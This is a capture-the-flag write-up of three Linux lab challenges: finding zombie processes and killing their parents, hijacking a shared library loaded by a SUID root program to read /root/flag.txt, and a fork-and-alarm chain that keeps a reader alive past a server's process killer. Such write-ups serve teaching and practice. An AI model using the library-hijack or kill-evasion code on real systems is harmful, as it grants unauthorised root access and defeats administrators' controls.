## Challenge: princess

The challenge contains many cabin processes. Some princess processes are already dead and appear as zombie processes with the state `Z`.

The goal is to destroy 50 cabins containing dead princesses without touching cabins with living princesses.

I started by inspecting the running processes:

```
ps -ef
ps -eo pid,ppid,stat,cmd --forest
```

The `ps` command displays running processes. The `--forest` option shows the process hierarchy.

To find dead princesses, I used:

```
ps -eo pid,ppid,stat,cmd | grep 'Z.*princess'
```

Example output:

```
2053  2052  Z  [princess_fury] <defunct>
2071  2070  Z  [princess_hollow] <defunct>
```

The important columns are `PID`, `PPID` and `STAT`. `Z` means that the princess process is a zombie. The `PPID` column contains the PID of its parent process, which represents the cabin.

I used the parent's PID to terminate the cabin:

```
kill 2052 #example
```

Then I repeated the search and terminated the next cabin:

```
kill 2070 #example
```

I continued this process manually until 50 cursed cabins were destroyed. New zombie princesses appeared over time, so I repeated the search whenever no zombies were visible.

After destroying 50 cabins, the challenge created `flag.txt` in my home directory:

```
/home/ctf/flag.txt
```

## Challenge: needle

The original program `meeting` loads a shared library called `libmeeting.so` using `dlopen()` and executes its `meeting()` function using `dlsym()`.

The executable has the SUID permission and belongs to root:

```
-rwsr-xr-x 1 root root 16712 ... meeting
```

SUID means that the program runs with the effective permissions of its owner. Since the owner is root, the program can access files that are normally unavailable to the `ctf` user.

The original program loads our shared library from the current directory. Therefore, I can create my own `libmeeting.so` and provide a custom `meeting()` function.

I created the source file `library.c`:

```
#include <stdio.h>
#include <stdlib.h>

void *meeting(void *arg)
{
    char *flag = malloc(256);
    if (flag == NULL)
        return NULL;

    FILE *file = fopen("/root/flag.txt", "r");

    if (file == NULL) {
        perror("fopen");
        free(flag);
        return NULL;
    }

    if (fgets(flag, 256, file) == NULL) {
        fclose(file);
        free(flag);
        return NULL;
    }

    fclose(file);
    return flag;
}
```

The `meeting()` function allocates memory for the flag using `malloc()`. Then `fopen()` opens `/root/flag.txt`, and `fgets()` reads its contents into memory.

Finally, `return flag` returns the flag to the original program.

I compiled the shared library using the command provided in the challenge description:

```
gcc -shared -fPIC -o libmeeting.so library.c -lpthread
```

The `-shared` option creates a shared library, while `-fPIC` generates position-independent code.

Finally, I executed the original program:

```
./meeting
```

The program loaded my `libmeeting.so`, executed the custom `meeting()` function and printed the flag:

```
Polythread has your concent and name: [flag]
```

This solution works because the original executable runs with root permissions and loads our custom shared library. Our function uses these permissions to read `/root/flag.txt` and return its contents to the original program.

## Challenge: fortforks

The challenge provides a named pipe (`/home/ctf/secrets`) containing a large stream of data. The goal is to read the entire stream and retrieve the flag located at the end.

The main difficulty is that the server terminates processes after approximately 5 seconds. Reading the entire stream takes around 30 seconds, so a normal reading process cannot finish in time.

To solve this, I wrote a C program that uses `fork()`, `alarm()` and signals to keep the reading process alive.

The main idea is to create a chain of processes. Every 3 seconds, the current process creates a child using `fork()`. The parent terminates, while the child continues execution and schedules the next alarm. The child inherits the open file descriptors, so reading continues from the same position in the pipe.

I also use `setsid()` to detach the process from the original SSH session and `signal(SIGHUP, SIG_IGN)` to ignore the hangup signal.

My source code `reader.c`:

```
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

void renew(int s) {
    if (fork() > 0) _exit(0);
    alarm(3);
}

int main() {
    if (fork() > 0) return 0;

    setsid();
    signal(SIGHUP, SIG_IGN);
    signal(SIGALRM, renew);
    alarm(3);

    int in = open("/home/ctf/secrets", O_RDONLY);
    int out = open("/home/ctf/result.txt",
                   O_WRONLY | O_CREAT | O_TRUNC, 0644);

    char b[4096];
    int n;

    while ((n = read(in, b, sizeof(b))) > 0)
        write(out, b, n);
}
```

I created the source file using `cat`:

```
cat > reader.c <<'EOF'
```

Then I inserted the C code and finished the input with `EOF`.

Next, I compiled the program:

```
gcc reader.c -o reader
```

Then I executed it:

```
./reader
```

Because the SSH connection was terminated by the server, I executed each command in a separate SSH session, reconnecting whenever necessary.

The program reads data from the named pipe in chunks of 4096 bytes and writes it to `result.txt`.

Finally, I checked the last 300 bytes of the resulting file:

```
tail -c 300 result.txt
```

The flag is located at the end of the stream.